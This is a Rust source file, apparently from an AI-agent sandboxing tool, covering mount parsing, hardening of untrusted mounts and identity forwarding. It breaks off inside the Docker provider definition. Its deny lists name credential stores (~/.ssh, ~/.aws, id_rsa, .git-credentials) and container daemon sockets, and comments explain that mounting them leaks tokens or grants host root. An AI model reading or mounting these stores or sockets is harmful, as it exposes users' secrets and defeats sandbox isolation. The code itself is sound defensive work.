//! Sandbox provider abstraction.
//!
//! A [`SandboxProvider`] decides *how* an agent subprocess is launched. The
//! spawn itself lives in [`crate::acp::AcpSubprocessClient`]; before building
//! the `Command`, the client runs the fully-resolved [`CommandSpec`] through a
//! [`SandboxSession::wrap`] so the provider can rewrite the invocation (e.g.
//! wrap it in `docker run`). The [`LocalProvider`] is the identity provider:
//! `wrap` returns the spec unchanged, so the un-sandboxed path is provably the
//! same behavior as before providers existed.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use serde::Deserialize;

use crate::config::{
    AgentKind, EgressMode, SandboxConfig, docker_uses_egress_proxy, egress_is_enforced,
};

/// Where a mount declaration came from. Mounts compose across origins (effective
/// set = their union). In M6a both origins are the trusted central
/// `config.toml`, so no clamping is applied; this enum is the seam M6b extends
/// with a `Varda` (untrusted `.varda`) origin plus a hardening floor.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MountOrigin {
    /// Image-intrinsic `[sandboxes.X].mounts` — same for every project using
    /// the image.
    Sandbox,
    /// Project-context `Route.mounts` — tied to the code↔context mapping.
    Route,
    /// Folder-local, repo-committed `.varda` origin. UNTRUSTED (attacker-
    /// influenceable on untrusted code): every `Varda` mount is clamped by the
    /// hardening floor ([`harden_varda_mount`]) before it can be applied. Produced
    /// at run time by [`crate::config::Config::resolve_sandbox_for`] and merged in
    /// via [`merge_mount_origins`].
    Varda,
}

/// Compose the three mount origins into a single origin-tagged list for a
/// provider: image-intrinsic (`Sandbox`), project-context (`Route`), and the
/// already-hardened untrusted `.varda` mounts (`Varda`). Order is
/// Sandbox → Route → Varda so an earlier (more trusted) origin wins the
/// first-declaration-wins de-duplication by target at wrap time.
pub fn merge_mount_origins(
    sandbox_mounts: &[String],
    route_mounts: &[String],
    varda_mounts: &[String],
) -> Vec<(MountOrigin, String)> {
    sandbox_mounts
        .iter()
        .map(|m| (MountOrigin::Sandbox, m.clone()))
        .chain(route_mounts.iter().map(|m| (MountOrigin::Route, m.clone())))
        .chain(varda_mounts.iter().map(|m| (MountOrigin::Varda, m.clone())))
        .collect()
}

/// Known secret/identity store directories, relative to `$HOME`. A mount whose
/// SOURCE resolves into any of these is refused **regardless of origin** (the
/// trusted central config included): they carry live LLM tokens AND cross-project
/// history, so mounting one defeats the sandbox and leaks other clients' data.
/// The sanctioned alternative is a curated identity FILE mount (see
/// `defaults.identity_context`).
pub const CREDENTIAL_DENYLIST: &[&str] = &[
    ".claude",
    ".codex",
    ".copilot",
    ".aws",
    ".azure",
    ".terraform.d",
    ".ssh",
    ".config/gcloud",
    ".config/fnox",
    ".gnupg",
    ".kube",
    ".docker",
    ".netrc",
    ".git-credentials",
];

/// Credential FILENAMES that may never be mounted even as a "curated identity"
/// file — the escape hatch that lets `identity_context` point at a specific file
/// inside an otherwise-denylisted dir (e.g. `~/.claude/CLAUDE.md`) must not become
/// a way to smuggle live tokens out.
pub const CREDENTIAL_FILENAMES: &[&str] = &[
    ".credentials.json",
    "credentials",
    ".netrc",
    ".git-credentials",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "id_dsa",
];

/// System / OS directories a mount TARGET may never be (nor sit under). Shadowing
/// these inside the container is a sandbox-integrity break.
pub const SYSTEM_TARGET_DIRS: &[&str] = &[
    "/", "/etc", "/usr", "/bin", "/sbin", "/lib", "/lib64", "/boot", "/dev", "/proc", "/sys",
    "/var", "/root",
];

fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME").map(PathBuf::from)
}

/// Best-effort symlink resolution for prefix matching; falls back to the path as
/// written when it does not yet exist on the host.
fn resolve_symlinks(path: &Path) -> PathBuf {
    std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
}

/// Control-plane paths (relative to `$HOME`) that may never be mounted into ANY
/// agent box — Orchestration M8 invariant 2. `~/.varda` holds every task, config,
/// session log and recap: mounting it hands a (possibly compromised) agent the
/// control plane, letting it edit tasks, read other clients' data, or drive spawns
/// outside the gated broker. Refused for ALL origins, like the credential store.
pub const CONTROL_PLANE_DENYLIST: &[&str] = &[".varda"];

/// Container-daemon socket basenames that may never be mounted into any agent box
/// — Orchestration M8 invariant 1. A mounted docker/podman socket is equivalent to
/// host root: the agent can start privileged containers, mount the host FS, and
/// escape the sandbox. Matched by basename so a re-targeted mount can't dodge the
/// well-known path.
pub const DOCKER_SOCKET_BASENAMES: &[&str] = &["docker.sock", "podman.sock"];

/// Canonical absolute container-daemon socket paths, refused regardless of basename
/// matching (belt and braces for invariant 1).
pub const DOCKER_SOCKET_PATHS: &[&str] = &[
    "/var/run/docker.sock",
    "/run/docker.sock",
    "/var/run/podman/podman.sock",
    "/run/podman/podman.sock",
];

/// Refuse a mount whose SOURCE is the control plane (`~/.varda`) or a container
/// daemon socket — Orchestration M8 invariants 1 & 2. Trust-independent (applies to
/// every origin, central config included): a mounted control plane or docker socket
/// defeats the sandbox regardless of who declared it.
pub fn check_control_plane_denylist(source: &Path) -> Result<()> {
    let resolved = resolve_symlinks(source);

    // Invariant 1 — never mount a container daemon socket.
    if let Some(name) = resolved.file_name().and_then(|n| n.to_str())
        && DOCKER_SOCKET_BASENAMES.contains(&name)
    {
        bail!(
            "refusing mount source '{}': it is a container daemon socket ('{name}') — mounting it \
             into an agent box is equivalent to host root and lets the agent escape the sandbox \
             (Orchestration M8 invariant 1: never mount the docker socket)",
            source.display()
        );
    }
    for sock in DOCKER_SOCKET_PATHS {
        if resolved == resolve_symlinks(Path::new(sock)) {
            bail!(
                "refusing mount source '{}': it is the container daemon socket '{sock}' — \
                 equivalent to host root (Orchestration M8 invariant 1: never mount the docker socket)",
                source.display()
            );
        }
    }

    // Invariant 2 — never mount the varda control plane (`~/.varda`).
    if let Some(home) = home_dir() {
        for entry in CONTROL_PLANE_DENYLIST {
            let denied = resolve_symlinks(&home.join(entry));
            if resolved == denied || resolved.starts_with(&denied) {
                bail!(
                    "refusing mount source '{}': it resolves into the varda control plane '{}' \
                     — mounting it hands the agent every task, session and the ability to drive \
                     spawns outside the gated broker (Orchestration M8 invariant 2: never mount `~/.varda`)",
                    source.display(),
                    home.join(entry).display()
                );
            }
        }
    }
    Ok(())
}

/// Refuse a mount whose SOURCE resolves into a known credential/identity store.
/// Applies to ALL origins (trust-independent). Symlink-resolved prefix match. Also
/// enforces the Orchestration M8 control-plane / docker-socket floor
/// (see [`check_control_plane_denylist`]) so every mount call site is covered.
pub fn check_credential_denylist(source: &Path) -> Result<()> {
    check_control_plane_denylist(source)?;
    let Some(home) = home_dir() else {
        return Ok(());
    };
    let resolved = resolve_symlinks(source);
    for entry in CREDENTIAL_DENYLIST {
        let denied = resolve_symlinks(&home.join(entry));
        if resolved == denied || resolved.starts_with(&denied) {
            bail!(
                "refusing mount source '{}': it resolves into the credential/identity store '{}' \
                 (denylisted for ALL origins — mounting it leaks live tokens and cross-project history; \
                 use `defaults.identity_context` for a curated read-only identity file instead)",
                source.display(),
                home.join(entry).display()
            );
        }
    }
    Ok(())
}

/// Validate a single curated identity mount (`defaults.identity_context` entry):
/// it must be a specific FILE (never a directory), read-only, and never a known
/// credential filename — even though it is allowed to live inside an otherwise
/// denylisted dir (e.g. `~/.claude/CLAUDE.md`).
pub fn check_identity_context_mount(source: &Path, writable: bool) -> Result<()> {
    if writable {
        bail!(
            "identity_context mount '{}' must be read-only (:ro)",
            source.display()
        );
    }
    if !source.is_file() {
        bail!(
            "identity_context mount '{}' must be an existing specific FILE, never a directory \
             or missing path (a whole dotdir/`projects/` transcript tree is forbidden)",
            source.display()
        );
    }
    if let Some(name) = source.file_name().and_then(|n| n.to_str())
        && CREDENTIAL_FILENAMES.contains(&name)
    {
        bail!(
            "identity_context mount '{}' is a credential file and may never be mounted",
            source.display()
        );
    }
    Ok(())
}

/// In-guest path the forwarded host SSH agent socket is mounted at. `git push`
/// over SSH signs on the host via this socket; no private key ever enters the box.
pub const SSH_AGENT_GUEST_SOCK: &str = "/ssh-agent";

/// M11 — the three "who is the user / how does the agent authenticate" channels,
/// threaded into a sandbox provider WITHOUT ever mounting a credential dir
/// (`~/.claude`/`.codex`/`.copilot`/`.aws`/`.ssh`). Each channel is separable and
/// opt-in; an empty value means "not forwarded". Principle: share the minimum.
///
/// 1. `auth_env` — a scoped, rotatable token injected as an env var so the agent
///    boots authenticated (resolved from a host env var / secret store, never a
///    repo secret; a DEDICATED sandbox token, not the primary credential).
/// 2. SSH-agent forwarding (`ssh_auth_sock`) + read-only git identity
///    (`git_name`/`git_email`) so `git push`/commit work with keys staying on the host.
/// 3. `identity_context` — curated READ-ONLY identity FILE mounts (M6b mechanism)
///    telling the agent "who the user is"; the credential denylist still applies.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct SandboxIdentity {
    /// Curated read-only identity FILE mounts (`defaults.identity_context`), each a
    /// `source[:target][:mode]` string. Applied read-only, credential-denylisted.
    pub identity_context: Vec<String>,
    /// Host `$SSH_AUTH_SOCK` to forward, when SSH-agent forwarding is enabled and a
    /// live agent socket exists on the host. `None` ⇒ not forwarded.
    pub ssh_auth_sock: Option<String>,
    /// Read-only git identity forwarded as `GIT_AUTHOR_*`/`GIT_COMMITTER_*` env.
    pub git_name: Option<String>,
    pub git_email: Option<String>,
    /// Scoped auth token(s) injected as in-box env vars (`target_name → value`).
    /// The value is resolved from the host env / a secret store at prepare time.
    pub auth_env: BTreeMap<String, String>,
    /// Scoped credential value(s) staged as read-only guest FILES
    /// (`guest_abs_path → value`), materialized via the session's `stage_file` at
    /// prepare time and cleaned on teardown. Resolved host-side like `auth_env`;
    /// only the minimal scoped value is written — never a credential dir mount.
    pub auth_files: BTreeMap<String, String>,
}

impl SandboxIdentity {
    /// `true` when no channel is active (fast-path: providers skip all identity
    /// wiring and the argv is byte-for-byte the pre-M11 one).
    pub fn is_empty(&self) -> bool {
        self.identity_context.is_empty()
            && self.ssh_auth_sock.is_none()
            && self.git_name.is_none()
            && self.git_email.is_none()
            && self.auth_env.is_empty()
            && self.auth_files.is_empty()
    }

    /// Guest env additions from channels 1 & 2: the scoped auth token(s), the
    /// forwarded git identity, and (when the agent socket is forwarded) the in-guest
    /// `SSH_AUTH_SOCK`. Merged into the box env alongside the resolved command env.
    pub fn guest_env(&self) -> BTreeMap<String, String> {
        let mut env = self.auth_env.clone();
        if let Some(name) = &self.git_name {
            env.insert("GIT_AUTHOR_NAME".to_owned(), name.clone());
            env.insert("GIT_COMMITTER_NAME".to_owned(), name.clone());
        }
        if let Some(email) = &self.git_email {
            env.insert("GIT_AUTHOR_EMAIL".to_owned(), email.clone());
            env.insert("GIT_COMMITTER_EMAIL".to_owned(), email.clone());
        }
        if self.ssh_auth_sock.is_some() {
            env.insert("SSH_AUTH_SOCK".to_owned(), SSH_AGENT_GUEST_SOCK.to_owned());
        }
        env
    }
}

/// Clamp a single UNTRUSTED `.varda` mount against the hardening floor. Returns the
/// (possibly mode-adjusted) [`MountSpec`] to apply, or an error naming the offending
/// key. `varda_file` is the path of the offending `.varda` for the error message.
///
/// Enforced (only for the `.varda` origin — trusted `Route`/`Sandbox` mounts skip
/// this, trust-by-origin):
/// - SOURCE must resolve INSIDE `project_root` (no out-of-tree / host paths).
/// - SOURCE is also subject to the credential denylist (checked by the caller for
///   all origins).
/// - forced `:ro` unless `allow_writable`.
/// - TARGET may not be `/`, a system dir, nor collide with / shadow the project
///   mount at `project_root`.
pub fn harden_varda_mount(
    spec: &MountSpec,
    project_root: &Path,
    allow_writable: bool,
    varda_file: &Path,
) -> Result<MountSpec> {
    let source = expand_mount_path(&spec.source, project_root);
    let resolved_source = resolve_symlinks(&source);
    let resolved_root = resolve_symlinks(project_root);
    if !resolved_source.starts_with(&resolved_root) {
        bail!(
            "`.varda` at {} declares mount source '{}' outside the project root {} \
             (untrusted `.varda` mounts must stay in-tree)",
            varda_file.display(),
            source.display(),
            project_root.display()
        );
    }

    let target = expand_mount_path(&spec.target, project_root);
    let target_str = target.to_string_lossy();
    for sysdir in SYSTEM_TARGET_DIRS {
        let sysdir_path = Path::new(sysdir);
        if target.as_path() == sysdir_path || (*sysdir != "/" && target.starts_with(sysdir_path)) {
            bail!(
                "`.varda` at {} declares mount target '{target_str}' which is (or is under) the \
                 system dir '{sysdir}' — forbidden",
                varda_file.display()
            );
        }
    }
    if target == resolved_root || target == project_root {
        bail!(
            "`.varda` at {} declares mount target '{target_str}' that collides with the project \
             mount {} — forbidden (it would shadow the project)",
            varda_file.display(),
            project_root.display()
        );
    }

    let writable = spec.writable && allow_writable;
    Ok(MountSpec {
        source: spec.source.clone(),
        target: spec.target.clone(),
        writable,
    })
}

/// A parsed mount request: a host `source` bind-mounted at `target` inside the
/// container, read-only unless `writable`.
///
/// `source`/`target` are stored as written (they may still contain `~` or
/// `{project}` and may be relative to the project root); expansion to absolute
/// host/container paths happens at wrap time via [`expand_mount_path`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MountSpec {
    pub source: PathBuf,
    pub target: PathBuf,
    pub writable: bool,
}

/// Interpret a mode segment (`ro`/`rw`/`w`) as a writability flag.
fn mount_mode_writable(segment: &str) -> Option<bool> {
    match segment {
        "ro" => Some(false),
        "rw" | "w" => Some(true),
        _ => None,
    }
}

/// Parse the `source[:target][:mode]` string grammar into a [`MountSpec`].
///
/// Forms (aligned with docker `src:dst:mode`):
/// - `SOURCE` — target defaults to SOURCE, read-only.
/// - `SOURCE:ro|:rw|:w` — target defaults to SOURCE, mode as given.
/// - `SOURCE:TARGET` — TARGET must be absolute (`/…`); read-only.
/// - `SOURCE:TARGET:ro|:rw|:w` — explicit target and mode.
///
/// Disambiguation of the segment after SOURCE: a value equal to `ro`/`rw`/`w`
/// is the MODE; a value starting with `/` is the TARGET. Anything else is an
/// error.
pub fn parse_mount(raw: &str) -> Result<MountSpec> {
    let parts: Vec<&str> = raw.split(':').collect();
    match parts.as_slice() {
        [source] if !source.is_empty() => Ok(MountSpec {
            source: PathBuf::from(source),
            target: PathBuf::from(source),
            writable: false,
        }),
        [source, second] if !source.is_empty() => {
            if let Some(writable) = mount_mode_writable(second) {
                Ok(MountSpec {
                    source: PathBuf::from(source),
                    target: PathBuf::from(source),
                    writable,
                })
            } else if second.starts_with('/') {
                Ok(MountSpec {
                    source: PathBuf::from(source),
                    target: PathBuf::from(second),
                    writable: false,
                })
            } else {
                bail!(
                    "invalid mount '{raw}': expected SOURCE, SOURCE:MODE, SOURCE:/ABS_TARGET, or SOURCE:/ABS_TARGET:MODE (MODE = ro|rw|w)"
                )
            }
        }
        [source, target, mode] if !source.is_empty() => {
            let writable = mount_mode_writable(mode).with_context(|| {
                format!("invalid mount '{raw}': trailing segment '{mode}' is not a mode (ro|rw|w)")
            })?;
            if !target.starts_with('/') {
                bail!("invalid mount '{raw}': TARGET '{target}' must be an absolute path");
            }
            Ok(MountSpec {
                source: PathBuf::from(source),
                target: PathBuf::from(target),
                writable,
            })
        }
        _ => bail!("invalid mount '{raw}': malformed (empty or too many ':'-separated segments)"),
    }
}

/// Refuse to launch a checkout whose `.git` file points somewhere the guest
/// cannot see. Git worktrees store an absolute `gitdir:` pointer into the mother
/// repository; mounting only the worktree makes every git command fail inside
/// the sandbox. A configured bind makes that pointer usable only when it maps
/// the target back to the *same* absolute guest path.
fn ensure_worktree_gitdir_visible(
    project_root: &Path,
    mounts: &[(MountOrigin, String)],
) -> Result<()> {
    let dot_git = project_root.join(".git");
    if !dot_git.is_file() {
        return Ok(());
    }

    let contents = std::fs::read_to_string(&dot_git)
        .with_context(|| format!("failed to read worktree pointer {}", dot_git.display()))?;
    let Some(raw_gitdir) = contents
        .lines()
        .find_map(|line| line.strip_prefix("gitdir:").map(str::trim))
    else {
        return Ok(());
    };
    let raw_gitdir = PathBuf::from(raw_gitdir);
    let gitdir = if raw_gitdir.is_absolute() {
        raw_gitdir
    } else {
        project_root.join(raw_gitdir)
    };
    let gitdir = normalize_absolute_path(&gitdir);
    if !gitdir.is_dir() {
        bail!("worktree gitdir {} does not exist", gitdir.display());
    }

    let commondir_file = gitdir.join("commondir");
    let commondir = if commondir_file.is_file() {
        let raw = std::fs::read_to_string(&commondir_file).with_context(|| {
            format!("failed to read worktree common-dir pointer {}", commondir_file.display())
        })?;
        let raw = PathBuf::from(raw.trim());
        let path = if raw.is_absolute() { raw } else { gitdir.join(raw) };
        let path = normalize_absolute_path(&path);
        if !path.is_dir() {
            bail!("worktree common directory {} does not exist", path.display());
        }
        Some(path)
    } else {
        None
    };

    let visible_at_same_path = |required: &Path| -> Result<bool> {
        if required.starts_with(project_root) {
            return Ok(true);
        }
        for (_, raw) in mounts {
            let spec = parse_mount(raw)
                .with_context(|| format!("invalid mount '{raw}' while checking worktree gitdir"))?;
            let source = expand_mount_path(&spec.source, project_root);
            let target = expand_mount_path(&spec.target, project_root);
            if let Ok(suffix) = required.strip_prefix(&source)
                && target.join(suffix) == required
            {
                return Ok(true);
            }
        }
        Ok(false)
    };

    if visible_at_same_path(&gitdir)?
        && commondir
            .as_deref()
            .map(|path| visible_at_same_path(path))
            .transpose()?
            .unwrap_or(true)
    {
        return Ok(());
    }

    bail!(
        "refusing to launch git worktree '{}': its .git pointer resolves to '{}', which is outside \
         the project mount, or its shared Git common directory is unavailable there. Mounting the \
         mother .git exposes its objects, refs, branches, and history; prefer a self-contained clone \
         before enabling git for isolated workers",
        project_root.display(),
        gitdir.display()
    )
}

/// Collapse `.` and `..` without resolving symlinks. Guest paths must retain
/// their declared spelling: a bind and a worktree pointer may intentionally use
/// the same symlinked absolute prefix even though the host canonical path differs.
fn normalize_absolute_path(path: &Path) -> PathBuf {
    use std::path::Component;

    let mut normalized = PathBuf::new();
    for component in path.components() {
        match component {
            Component::Prefix(prefix) => normalized.push(prefix.as_os_str()),
            Component::RootDir => normalized.push(component.as_os_str()),
            Component::CurDir => {}
            Component::ParentDir => {
                normalized.pop();
            }
            Component::Normal(part) => normalized.push(part),
        }
    }
    normalized
}

impl<'de> Deserialize<'de> for MountSpec {
    /// Serde helper accepting BOTH the string shorthand (parsed by
    /// [`parse_mount`]) and the canonical table form
    /// `{ source, target?, mode? }`.
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        #[derive(Deserialize)]
        #[serde(untagged)]
        enum Raw {
            Str(String),
            Table {
                source: String,
                #[serde(default)]
                target: Option<String>,
                #[serde(default)]
                mode: Option<String>,
            },
        }
        match Raw::deserialize(deserializer)? {
            Raw::Str(s) => parse_mount(&s).map_err(serde::de::Error::custom),
            Raw::Table {
                source,
                target,
                mode,
            } => {
                let writable = match mode.as_deref() {
                    None | Some("ro") => false,
                    Some("rw") | Some("w") => true,
                    Some(other) => {
                        return Err(serde::de::Error::custom(format!(
                            "invalid mount mode '{other}' (expected ro|rw|w)"
                        )));
                    }
                };
                let target = target
                    .map(PathBuf::from)
                    .unwrap_or_else(|| PathBuf::from(&source));
                Ok(MountSpec {
                    source: PathBuf::from(source),
                    target,
                    writable,
                })
            }
        }
    }
}

/// Expand `~` (HOME), `{project}` (the matched project root), and
/// project-root-relative paths into an absolute host/container path.
fn expand_mount_path(raw: &Path, project_root: &Path) -> PathBuf {
    let text = raw.to_string_lossy();
    let text = text.replace("{project}", &project_root.to_string_lossy());
    let expanded = if text == "~" {
        std::env::var_os("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from(text.clone()))
    } else if let Some(rest) = text.strip_prefix("~/") {
        std::env::var_os("HOME")
            .map(|home| Path::new(&home).join(rest))
            .unwrap_or_else(|| PathBuf::from(text.clone()))
    } else {
        PathBuf::from(text)
    };
    if expanded.is_absolute() {
        expanded
    } else {
        project_root.join(expanded)
    }
}

/// A fully-resolved subprocess invocation, before it is handed to the OS.
///
/// Providers rewrite this in [`SandboxSession::wrap`]. For `local` it is the
/// literal command; for `docker` the whole thing is folded into `docker run …`
/// arguments and `env` is emptied (moved into `-e K=V` flags).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandSpec {
    pub program: String,
    pub args: Vec<String>,
    pub env: BTreeMap<String, String>,
    pub cwd: Option<PathBuf>,
}

/// Env var proving "this process is running inside a varda-managed sandbox,"
/// set unconditionally by [`mark_sandboxed`] for every non-`local` launch —
/// unlike `VARDA_MCP_ADDR`/`VARDA_MCP_SOCKET` (set only when orchestration's
/// MCP broker is wired), this is the one signal proven to hold for an
/// interactive docker/microsandbox/clawk launch with no broker attached too
/// (#806). [`crate::config::detect_launch_context`] checks this first.
pub const SANDBOXED_MARKER_ENV: &str = "VARDA_SANDBOXED";

/// Insert [`SANDBOXED_MARKER_ENV`] into `spec.env` for any non-`local`
/// provider — `local` crosses no sandbox boundary (matches
/// `resolve_sandbox_identity`'s "local ignores them, no boundary to cross").
///
/// Callers MUST call this BEFORE [`SandboxSession::wrap`]: boundary-crossing
/// providers (docker) fold `env` into the wrapped command's argv/`-e` flags
/// and empty the map, so inserting after `wrap()` would silently drop the
/// marker for exactly the launches it exists to cover.
pub fn mark_sandboxed(spec: &mut CommandSpec, provider_name: &str) {
    if provider_name != "local" {
        spec.env
            .insert(SANDBOXED_MARKER_ENV.to_owned(), "1".to_owned());
    }
}

/// How an agent subprocess is launched (M13a §1). This is *how you launch*, not
/// part of the command data, so it is a `wrap()` parameter rather than a
/// [`CommandSpec`] field.
///
/// - [`Batch`](LaunchMode::Batch): the prompt is fed on stdin, stdout is captured
///   for the recap, and there is no TTY. This is the pre-M13a behavior.
/// - [`Interactive`](LaunchMode::Interactive): a TTY is attached to the user's
///   terminal (docker `-it`, `msb -t`). For docker this is a DIFFERENT LIFECYCLE
///   (`create` → `docker cp` → `start -ai`), driven via
///   [`SandboxSession::begin_interactive`].
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LaunchMode {
    Batch,
    Interactive,
}

/// Read-only context describing the task being launched.
///
/// `route_glob`, `agent_kind`, and `session_id` are threaded through for
/// providers that will key on them in later milestones (image selection,
/// per-session container names); the M1 providers don't read them yet.
#[allow(dead_code)]
pub struct SandboxContext<'a> {
    pub project_root: &'a Path,
    pub route_glob: &'a str,
    pub agent_kind: AgentKind,
    pub session_id: &'a str,
}

#[async_trait]
pub trait SandboxProvider: Send + Sync {
    fn name(&self) -> &str;
    async fn prepare(&self, ctx: &SandboxContext<'_>) -> Result<Box<dyn SandboxSession>>;
}

#[async_trait]
pub trait SandboxSession: Send + Sync {
    /// Rewrite a resolved command for execution inside this sandbox.
    ///
    /// `mode` selects the launch contract (M13a §1): [`LaunchMode::Batch`] keeps
    /// the pre-M13a stdin/stdout pipe form; [`LaunchMode::Interactive`] emits the
    /// TTY form (docker `-it` + `create`, `msb -t`). For docker, Interactive
    /// returns the `docker create …` invocation; the actual TTY-attached process
    /// is produced by [`begin_interactive`](Self::begin_interactive).
    fn wrap(&self, spec: CommandSpec, mode: LaunchMode) -> Result<CommandSpec>;
    /// Whether a BATCH task prompt must be delivered as a staged guest FILE
    /// (redirected into the agent's stdin in-guest by [`wrap`](Self::wrap))
    /// instead of being piped to the child process's stdin. True for microVM
    /// primitives whose `run` does NOT forward host stdin into the guest (msb),
    /// where a batch agent reading stdin (`claude -p`) would otherwise hang and
    /// exit "no stdin data received". Default false — `local`/`docker` forward
    /// stdin, so the pipe works and no file staging is needed.
    fn prompt_via_file(&self) -> bool {
        false
    }
    /// Stage a host-provided file so it is visible INSIDE the guest before the
    /// interactive process starts (M13a §3, §5). Returns the guest-visible path
    /// the caller should advertise (e.g. via `VARDA_PROMPT_FILE`).
    ///
    /// Providers differ in *when* the copy lands: msb records it for a pre-boot
    /// `--copy-file` (emitted by [`wrap`](Self::wrap)); docker records it for a
    /// `docker cp` performed between `create` and `start` (in
    /// [`begin_interactive`](Self::begin_interactive)); local just writes a host
    /// temp whose path is already guest-visible. The default implements the local
    /// behavior.
    fn stage_file(&self, content: &str, _guest_path: &str) -> Result<String> {
        Ok(write_stage_temp(content, false)?.display().to_string())
    }
    /// Stage a scoped credential VALUE as a READ-ONLY file inside the guest
    /// (M11-ext file target). Same guest-delivery machinery as
    /// [`stage_file`](Self::stage_file), but the host temp is written `0o400` so
    /// the value is never left mutable and — because `docker cp` / `msb
    /// --copy-file` preserve the source mode — lands read-only in-guest. Unlike
    /// the prompt, this must reach the guest in BOTH launch modes, so
    /// boundary-crossing providers deliver it in batch too (docker via
    /// [`begin_batch`](Self::begin_batch), msb via a pre-boot `--copy-file`).
    fn stage_credential_file(&self, content: &str, _guest_path: &str) -> Result<String> {
        Ok(write_stage_temp(content, true)?.display().to_string())
    }
    /// Scoped credential values (`guest_abs_path → value`) that must be staged as
    /// read-only files INSIDE the guest before the process starts (M11-ext file
    /// targets). The caller stages each via
    /// [`stage_credential_file`](Self::stage_credential_file) between `prepare`
    /// and `wrap`. The default is empty (`local` crosses no boundary);
    /// boundary-crossing providers return their identity's `auth_files`.
    fn identity_files(&self) -> BTreeMap<String, String> {
        BTreeMap::new()
    }
    /// Drive any provider-specific pre-start staging a BATCH launch needs and
    /// return the FINAL command the caller spawns (stdin piped for the prompt,
    /// stdout captured). Mirrors [`begin_interactive`](Self::begin_interactive)
    /// for the non-TTY path. The default returns `wrapped` unchanged (local: no
    /// boundary; msb: file targets are baked into `wrap` as pre-boot
    /// `--copy-file`). Docker overrides it to `docker create` → `docker cp` the
    /// staged credential files → `docker start -ai` so a batch `file`-target
    /// credential actually reaches the guest (its `docker run` streaming form
    /// cannot copy a file in before the agent starts).
    async fn begin_batch(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        Ok(wrapped)
    }
    /// Drive a provider-specific interactive launch lifecycle and return the FINAL
    /// command the caller spawns with the user's TTY inherited (M13a §2). `wrapped`
    /// is the output of `wrap(.., Interactive)`. The default returns it unchanged
    /// (local / msb, whose interactive command is spawned directly). Docker
    /// overrides this to run `docker create`, `docker cp` the staged files, and
    /// return `docker start -ai <container>`.
    async fn begin_interactive(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        Ok(wrapped)
    }
    /// Filesystem root under which the agent's own session store lives, when it
    /// is reachable from the host. `None` degrades resume-capture (M1 docker).
    ///
    /// For live stores this path is written during the run; for extracted stores
    /// (docker volume + `docker cp`) it is only populated by
    /// [`extract_session_store`](Self::extract_session_store) after the run.
    fn session_store_root(&self) -> Option<PathBuf>;
    /// `true` when the session store is written directly to a host-visible path
    /// during the run (so resume-discovery can poll live). `false` when the store
    /// is materialized only after the run (docker volume + `docker cp`); callers
    /// must call [`extract_session_store`](Self::extract_session_store) and then
    /// discover once, rather than polling during the run.
    fn store_is_live(&self) -> bool {
        true
    }
    /// Fail loudly when a declared bind-mount SOURCE is not reachable on the host
    /// (a would-be empty in-VM stub on a VM-backed daemon), naming the path.
    /// No-op for providers that do not bind host paths.
    fn validate_mounts(&self) -> Result<()> {
        Ok(())
    }
    /// Materialize the agent's session store on the host after the run and before
    /// teardown (e.g. `docker cp` from a per-session volume into
    /// [`session_store_root`](Self::session_store_root)). No-op for live stores.
    async fn extract_session_store(&self) -> Result<()> {
        Ok(())
    }
    /// Whether the guest reached the provider's agent relay. `None` means the
    /// provider has no authoritative boot signal.
    async fn guest_relay_connected(&self) -> Option<bool> {
        None
    }
    async fn teardown(self: Box<Self>) -> Result<()>;
}

/// Identity provider: no isolation, `wrap` returns the spec unchanged.
pub struct LocalProvider;

#[async_trait]
impl SandboxProvider for LocalProvider {
    fn name(&self) -> &str {
        "local"
    }

    async fn prepare(&self, _ctx: &SandboxContext<'_>) -> Result<Box<dyn SandboxSession>> {
        Ok(Box::new(LocalSession))
    }
}

pub struct LocalSession;

#[async_trait]
impl SandboxSession for LocalSession {
    fn wrap(&self, spec: CommandSpec, _mode: LaunchMode) -> Result<CommandSpec> {
        // Identity provider: the invocation is unchanged for BOTH modes, so the
        // un-sandboxed interactive path is byte-for-byte the pre-M13a host
        // behavior (M13a §2 local requirement). The host temp staged by the
        // default `stage_file` is already guest-visible, so no rewrite is needed.
        Ok(spec)
    }

    fn session_store_root(&self) -> Option<PathBuf> {
        std::env::var_os("HOME").map(PathBuf::from)
    }

    async fn teardown(self: Box<Self>) -> Result<()> {
        Ok(())
    }
}

/// Docker provider: wraps the agent invocation in `docker run` so it executes
/// inside a container whose only bind mount is the project directory and whose
/// only reachable network hosts are an explicit egress allow-list.
pub struct DockerProvider {
    name: String,
    /// A pre-existing image tag/reference. `None` when `build` is set.
    image: Option<String>,
    /// Path to a Dockerfile to build at `prepare()`. Takes precedence over
    /// `image` when both are set; the resulting content-addressed tag is used.
    build: Option<String>,
    /// External image source (currently only `"devcontainer"`). When set, the
    /// image is derived at `prepare()` from the project's `.devcontainer/`
    /// definition and takes precedence over `image`/`build`. varda takes ONLY the
    /// image/build from the devcontainer — never its mounts, runArgs, socket
    /// forwarding, or lifecycle hooks (isolation invariant).
    image_from: Option<String>,
    /// Extra host paths (beyond the project root) the sandbox may see, tagged by
    /// origin and following the `source[:target][:mode]` grammar. The effective
    /// set is the union of the image-intrinsic (`Sandbox`) and project-context
    /// (`Route`) mounts, de-duplicated by target at wrap time.
    mounts: Vec<(MountOrigin, String)>,
    /// Egress allow-list of hostnames. Empty ⇒ the container is fully offline
    /// (`--network none`). Non-empty is enforced by an allow-listing forward-proxy
    /// sidecar (`egress_mode` `strict`/`proxy`) or, legacy, by DNS-pin.
    egress: Vec<String>,
    /// How `egress` is enforced. `dns-pin` keeps the legacy `--add-host` pins;
    /// `strict`/`proxy` route the box through the forward-proxy sidecar.
    egress_mode: EgressMode,
    /// Forward-proxy image used in `strict`/`proxy` egress mode (see
    /// [`DEFAULT_EGRESS_PROXY_IMAGE`]).
    egress_proxy_image: String,
